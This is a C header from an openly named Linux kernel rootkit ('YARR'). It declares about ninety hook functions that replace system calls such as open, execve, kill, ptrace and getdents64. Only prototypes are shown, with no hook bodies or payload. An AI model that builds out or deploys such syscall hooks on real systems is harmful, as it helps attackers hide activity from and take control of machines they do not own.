/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#ifndef __YARR_SYSCALL_HOOKS
#define __YARR_SYSCALL_HOOKS

#include <linux/resource.h>
#include <linux/sched.h>
#include <linux/perf_event.h>
#include <linux/utime.h>
#include <linux/dirent.h>
#include <linux/mqueue.h>
#include <asm-generic/statfs.h>

extern void *syscalls_hooks[];

/***
 * Hook for sys_open().
 */
asmlinkage long yarr_open(const char __user *filename, int flags, int mode);

/***
 * Hook for sys_waitpid().
 */
asmlinkage long yarr_waitpid(pid_t pid, int __user *stat_addr, int options);

/***
 * Hook for sys_creat().
 */
asmlinkage long yarr_creat(const char __user *filename, int mode);

/***
 * Hook for sys_link().
 */
asmlinkage long yarr_link(const char __user *oldname,
						  const char __user *newname);

/***
 * Hook for sys_unlink().
 */
asmlinkage long yarr_unlink(const char __user *pathname);

/***
 * Hook for sys_execve().
 */
asmlinkage long yarr_execve(const char __user *filename,
							const char __user *const __user *argv,
							const char __user *const __user *envp,
							struct pt_regs *regs);

/***
 * Hook for sys_chdir().
 */
asmlinkage long yarr_chdir(const char __user *filename);

/***
 * Hook for sys_mknod().
 */
asmlinkage long yarr_mknod(const char __user *filename, int mode,
						   unsigned dev);

/***
 * Hook for sys_chmod().
 */
asmlinkage long yarr_chmod(const char __user *filename, mode_t mode);

/***
 * Hook for sys_lchown().
 */
asmlinkage long yarr_lchown(const char __user *filename, uid_t user,
							gid_t group);

/***
 * Hook for sys_getpid().
 */
asmlinkage long yarr_getpid(void);

/***
 * Hook for sys_mount().
 */
asmlinkage long yarr_mount(char __user *dev_name, char __user *dir_name,
						   char __user *type, unsigned long flags,
						   void __user *data);

/***
 * Hook for sys_umount().
 */
asmlinkage long yarr_umount(char __user *name, int flags);

/***
 * Hook for sys_ptrace().
 */
asmlinkage long yarr_ptrace(long request, long pid, unsigned long addr,
							unsigned long data);

/***
 * Hook for sys_utime().
 */
asmlinkage long yarr_utime(char __user *filename,
						   struct utimbuf __user *times);

/***
 * Hook for sys_access().
 */
asmlinkage long yarr_access(const char __user *filename, int mode);

/***
 * Hook for sys_kill().
 */
asmlinkage long yarr_kill(int pid, int sig);

/***
 * Hook for sys_rename().
 */
asmlinkage long yarr_rename(const char __user *oldname,
							const char __user *newname);

/***
 * Hook for sys_mkdir().
 */
asmlinkage long yarr_mkdir(const char __user *pathname, int mode);

/***
 * Hook for sys_rmdir().
 */
asmlinkage long yarr_rmdir(const char __user *pathname);

/***
 * Hook for sys_acct().
 */
asmlinkage long yarr_acct(const char __user *name);

/***
 * Hook for sys_chroot().
 */
asmlinkage long yarr_chroot(const char __user *filename);

/***
 * Hook for sys_symlink().
 */
asmlinkage long yarr_symlink(const char __user *old, const char __user *new);

/***
 * Hook for sys_readlink().
 */
asmlinkage long yarr_readlink(const char __user *path, char __user *buf,
							  int bufsiz);

/***
 * Hook for sys_uselib().
 */
asmlinkage long yarr_uselib(const char __user *library);

/***
 * Hook for sys_swapon().
 */
asmlinkage long yarr_swapon(const char __user *specialfile, int swap_flags);

/***
 * Hook for sys_readdir().
 */
asmlinkage long yarr_readdir(const char __user *specialfile, int swap_flags);

/***
 * Hook for sys_truncate().
 */
asmlinkage long yarr_truncate(const char __user *path, long length);

/***
 * Hook for sys_setpgid().
 */
asmlinkage long yarr_setpgid(pid_t pid, pid_t pgid);

/***
 * Hook for sys_getpriority().
 */
asmlinkage long yarr_getpriority(int which, int who);

/***
 * Hook for sys_setpriority().
 */
asmlinkage long yarr_setpriority(int which, int who, int niceval);

/***
 * Hook for sys_statfs().
 */
asmlinkage long yarr_statfs(const char __user *path,
							struct statfs __user *buf);

/***
 * Hook for sys_stat().
 */
asmlinkage long yarr_stat(const char __user *filename,
						  struct __old_kernel_stat __user *statbuf);

/***
 * Hook for sys_lstat().
 */
asmlinkage long yarr_lstat(const char __user *filename,
						   struct __old_kernel_stat __user *statbuf);

/***
 * Hook for sys_wait4().
 */
asmlinkage long yarr_wait4(pid_t pid, int __user *stat_addr, int options,
						   struct rusage __user *ru);

/***
 * Hook for sys_swapoff().
 */
asmlinkage long yarr_swapoff(const char __user *specialfile);

/***
 * Hook for sys_quotactl().
 */
asmlinkage long yarr_quotactl(unsigned int cmd, const char __user *special,
							  qid_t qid, void __user *addr);

/***
 * Hook for sys_getpgid().
 */
asmlinkage long yarr_getpgid(pid_t pid);

// TODO: Study and hook all those dentry related syscalls like sys_getdents().

/***
 * Hook for sys_getsid().
 */
asmlinkage long yarr_getsid(pid_t pid);

/***
 * Hook for sys_sched_setparam().
 */
asmlinkage long yarr_sched_setparam(pid_t pid,
									struct sched_param __user *param);

/***
 * Hook for sys_sched_getparam().
 */
asmlinkage long yarr_sched_getparam(pid_t pid,
									struct sched_param __user *param);

/***
 * Hook for sys_sched_setscheduler().
 */
asmlinkage long yarr_sched_setscheduler(pid_t pid, int policy,
										struct sched_param __user *param);

/***
 * Hook for sys_sched_getscheduler().
 */
asmlinkage long yarr_sched_getscheduler(pid_t pid);

/***
 * Hook for sys_sched_rr_get_interval().
 */
asmlinkage long yarr_sched_rr_get_interval(pid_t pid,
										   struct timespec __user *interval);

/***
 * Hook for sys_rt_sigqueueinfo().
 */
asmlinkage long yarr_rt_sigqueueinfo(int pid, int sig,
									 siginfo_t __user *uinfo);

/***
 * Hook for sys_chown().
 */
asmlinkage long yarr_chown(const char __user *filename, uid_t user,
						   gid_t group);

/***
 * Hook for sys_capget().
 */
asmlinkage long yarr_capget(cap_user_header_t header,
							cap_user_data_t dataptr);

/***
 * Hook for sys_capset().
 */
asmlinkage long yarr_capset(cap_user_header_t header,
							const cap_user_data_t data);

/***
 * Hook for sys_truncate64().
 */
asmlinkage long yarr_truncate64(const char __user *path, loff_t length);

/***
 * Hook for sys_stat64().
 */
asmlinkage long yarr_stat64(const char __user *filename,
							struct stat64 __user *statbuf);

/***
 * Hook for sys_lstat64().
 */
asmlinkage long yarr_lstat64(const char __user *filename,
							 struct stat64 __user *statbuf);

/***
 * Hook for sys_pivot_root().
 */
asmlinkage long yarr_pivot_root(const char __user *new_root,
								const char __user *put_old);

/***
 * Hook for sys_getdents64().
 */
asmlinkage long yarr_getdents64(unsigned int fd,
								struct linux_dirent64 __user *dirent,
								unsigned int count);

/***
 * Hook for sys_setxattr().
 */
asmlinkage long yarr_setxattr(const char __user *path, const char __user *name,
							  const void __user *value, size_t size,
							  int flags);

/***
 * Hook for sys_lsetxattr().
 */
asmlinkage long yarr_lsetxattr(const char __user *path,
							   const char __user *name,
							   const void __user *value,
							   size_t size, int flags);

/***
 * Hook for sys_getxattr().
 */
asmlinkage long yarr_getxattr(const char __user *path,
							  const char __user *name,
							  const void __user *value,
							  size_t size);

/***
 * Hook for sys_lgetxattr().
 */
asmlinkage long yarr_lgetxattr(const char __user *path,
							   const char __user *name,
							   const void __user *value,
							   size_t size);

/***
 * Hook for sys_listxattr().
 */
asmlinkage long yarr_listxattr(const char __user *path, char __user *list,
							   size_t size);

/***
 * Hook for sys_llistxattr().
 */
asmlinkage long yarr_llistxattr(const char __user *path, char __user *list,
								size_t size);

/***
 * Hook for sys_removexattr().
 */
asmlinkage long yarr_removexattr(const char __user *path,
								 const char __user *name);

/***
 * Hook for sys_lremovexattr().
 */
asmlinkage long yarr_lremovexattr(const char __user *path,
								  const char __user *name);

// TODO: Why the fuck did I write this prototype? There is no
// sys_sched_sigtimedwait()... I won't remove this yet.
/***
 * Hook for sys_sched_sigtimedwait().
 */
/*asmlinkage long yarr_sched_sigtimedwait(int pid, int sig,
										siginfo_t __user *uinfo);
*/

/***
 * Hook for sys_tkill().
 */
asmlinkage long yarr_tkill(int pid, int sig);

/***
 * Hook for sys_sched_setaffinity().
 */
asmlinkage long yarr_sched_setaffinity(int pid, unsigned int len,
									   unsigned long __user *user_mask_ptr);

/***
 * Hook for sys_sched_getaffinity().
 */
asmlinkage long yarr_sched_getaffinity(int pid, unsigned int len,
									   unsigned long __user *user_mask_ptr);

/***
 * Hook for sys_statfs64().
 */
asmlinkage long yarr_statfs64(const char __user *path, size_t sz,
							  struct statfs64 __user *buf);

/***
 * Hook for sys_tgkill().
 */
asmlinkage long yarr_tgkill(int tgid, int pid, int sig);

/***
 * Hook for sys_mq_open().
 */
asmlinkage long yarr_mq_open(const char __user *name, int oflag, mode_t mode,
							 struct mq_attr __user *attr);

/***
 * Hook for sys_mq_unlink().
 */
asmlinkage long yarr_mq_unlink(const char __user *name);

/***
 * Hook for sys_waitid().
 */
asmlinkage long yarr_waitid(int which, pid_t pid, struct siginfo __user *infop,
							int options, struct rusage __user *ru);

/***
 * Hook for sys_ioprio_set().
 */
asmlinkage long yarr_ioprio_set(int which, int who, int ioprio);

/***
 * Hook for sys_ioprio_get().
 */
asmlinkage long yarr_ioprio_get(int which, int who, int ioprio);

/***
 * Hook for sys_migrate_pages().
 */
asmlinkage long yarr_migrate_pages(pid_t pid, unsigned long maxnode,
								   const unsigned long __user *from,
								   const unsigned long __user *to);

/***
 * Hook for sys_openat().
 */
asmlinkage long yarr_openat(int dfd, const char __user *filename, int flags,
							int mode);

/***
 * Hook for sys_mkdirat().
 */
asmlinkage long yarr_mkdirat(int dfd, const char __user *pathname, int mode);

/***
 * Hook for sys_mknodat().
 */
asmlinkage long yarr_mknodat(int dfd, const char __user *pathname, int mode,
							 int dev);

/***
 * Hook for sys_fchownat().
 */
asmlinkage long yarr_fchownat(int dfd, const char __user *filename, uid_t user,
							  gid_t group, int flag);

/***
 * Hook for sys_futimesat().
 */
asmlinkage long yarr_futimesat(int dfd, const char __user *filename,
							   struct timeval __user *utimes);

/***
 * Hook for sys_fstatat64().
 */
asmlinkage long yarr_fstatat64(int dfd, const char __user *filename,
							   struct stat64 __user *statbuf, int flag);

/***
 * Hook for sys_unlinkat().
 */
asmlinkage long yarr_unlinkat(int dfd, const char __user *filename, int flag);

/***
 * Hook for sys_renameat().
 */
asmlinkage long yarr_renameat(int olddfd, const char __user *oldname,
							  int newdfd, const char __user *newname);

/***
 * Hook for sys_linkat().
 */
asmlinkage long yarr_linkat(int olddfd, const char __user *oldname,
							int newdfd, const char __user *newname, int flag);

/***
 * Hook for sys_symlinkat().
 */
asmlinkage long yarr_symlinkat(const char __user *oldname, int newdfd,
							   const char __user *newname);

/***
 * Hook for sys_readlinkat().
 */
asmlinkage long yarr_readlinkat(int dfd, const char __user *path,
								char __user *buf, int bufsiz);

/***
 * Hook for sys_fchmodat().
 */
asmlinkage long yarr_fchmodat(int dfd, const char __user *filename,
							  mode_t mode);

/***
 * Hook for sys_faccess().
 */
asmlinkage long yarr_faccessat(int dfd, const char __user *filename, int mode);

/***
 * Hook for sys_move_pages().
 */
asmlinkage long yarr_move_pages(pid_t pid, unsigned long nr_pages,
								const void __user * __user *pages,
								const int  __user *nodes,
								int __user *status, int flags);

/***
 * Hook for sys_utimensat().
 */
asmlinkage long yarr_utimensat(int dfd, const char __user *filename,
							   struct timespec __user *utimes, int flags);

/***
 * Hook for sys_rt_tgsigqueueinfo().
 */
asmlinkage long yarr_rt_tgsigqueueinfo(pid_t tgid, pid_t pid, int sig,
									   siginfo_t __user *uinfo);

/***
 * Hook for sys_perf_event_open().
 */
asmlinkage long yarr_perf_event_open(struct perf_event_attr __user *attr_uptr,
									 pid_t pid, int cpu, int group_fd,
									 unsigned long flags);

/***
 * Hook for sys_prlimit64().
 */
asmlinkage long yarr_prlimit64(pid_t pid, unsigned int resource,
							   const struct rlimit64 __user *new_rlim,
							   struct rlimit64 __user *old_rlim);

/***
 * Hook for sys_name_to_handle_at().
 */
asmlinkage long yarr_name_to_handle_at(int dfd, const char __user *name,
									   struct file_handle __user *handle,
									   int __user *mnt_id, int flag);

/***
 * Hook for sys_process_vm_readv().
 */
asmlinkage long yarr_process_vm_readv(pid_t pid,
									  const struct iovec __user *lvec,
									  unsigned long liovcnt,
									  const struct iovec __user *rvec,
									  unsigned long riovcnt,
									  unsigned long flags);

/***
 * Hook for sys_process_vm_writev().
 */
asmlinkage long yarr_process_vm_writev(pid_t pid,
									   const struct iovec __user *lvec,
									   unsigned long liovcnt,
									   const struct iovec __user *rvec,
									   unsigned long riovcnt,
									   unsigned long flags);

#endif /* __YARR_SYSCALL_HOOKS */

